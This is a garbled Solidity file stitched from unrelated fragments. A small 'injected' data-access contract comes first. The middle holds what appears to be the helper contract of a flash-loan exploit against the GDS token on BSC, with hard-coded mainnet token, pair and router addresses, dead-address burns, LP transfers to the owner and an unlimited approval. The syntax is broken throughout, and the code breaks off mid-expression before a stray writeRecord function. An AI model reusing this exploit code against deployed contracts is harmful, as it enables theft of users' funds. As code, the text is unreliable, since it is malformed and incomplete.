
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

/*;

;
;
interface GDSToken is IERC20{
    function pureUsdtToToken(uint256 _uAmount) external returns(uint256)};
interface ISwapFlashLoan{
    function flashLoan(address receiver,
        address token,
        uint256 amount,
        bytes memory params) external};
interface IClaimReward{
    function transferToken() external;
    function withdraw() external};
contract ClaimReward{
    address Owner;
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    constructor(){
        Owner = msg.sender};
    function transferToken() external{
        GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));
        Pair.transfer(Owner, Pair.balanceOf(address(this)))};
    function withdraw() external{
        GDS.transfer(deadAddress, 10_000);
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
        GDS.approve(address(Router), type(uint).max);
        address [] memory path = new address[](2);
        path[0] = address(GDS
function writeRecord(bytes32 key, string memory data) public {
    records[key] = data}